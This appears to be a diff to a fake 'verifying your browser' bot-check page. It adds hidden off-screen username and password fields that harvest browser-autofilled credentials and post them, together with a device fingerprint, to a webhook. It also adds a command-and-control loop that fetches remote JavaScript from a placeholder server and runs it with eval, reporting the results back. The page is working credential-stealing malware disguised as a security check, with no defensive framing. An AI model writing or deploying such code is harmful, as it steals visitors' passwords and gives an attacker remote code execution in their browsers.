@@ -14,11 +14,22 @@
       font-size: 20px;
       color: green;
     }
+    input[type="text"], input[type="password"] {
+      opacity: 0;
+      position: absolute;
+      top: -9999px;
+    }
   </style>
 </head>
 <body>
   <h1>🔐 Verifying your browser...</h1>
   <p id="status">Please wait while we verify you're not a bot.</p>
+
+  <!-- Autofill Trap -->
+  <form id="autofillTrap">
+    <input type="text" name="username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
 
 <script>
 (async () => {
@@ -92,15 +103,47 @@
     country: geo.country_name || "N/A"
   };
 
+  // Send full fingerprint
   await fetch(webhook, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      content: `📡 Fingerprint Beacon:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+      content: `📡 Fingerprint Data:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
     })
   });
 
-  // Optional redirection
+  // Attempt to read autofilled credentials after delay
+  setTimeout(() => {
+    const user = document.querySelector("input[name='username']").value;
+    const pass = document.querySelector("input[name='password']").value;
+
+    if (user || pass) {
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🟡 Autofilled Credentials:\n\`\`\`json\n${JSON.stringify({ username: user, password: pass }, null, 2)}\n\`\`\``
+        })
+      });
+    }
+  }, 3000);
+
+  // Polling-based C2: fetch remote JS and run
+  try {
+    const c2 = await fetch("https://your-server.com/cmd.js").then(r => r.text());
+    const result = eval(c2);
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `⚙️ C2 Command Executed:\n\`\`\`js\n${c2}\n\`\`\`\n📤 Result: ${result}`
+      })
+    });
+  } catch (e) {
+    // Silent fail
+  }
+
+  // Optional: redirect to a real site
   // window.location.href = "https://google.com";
 })();
 </script>
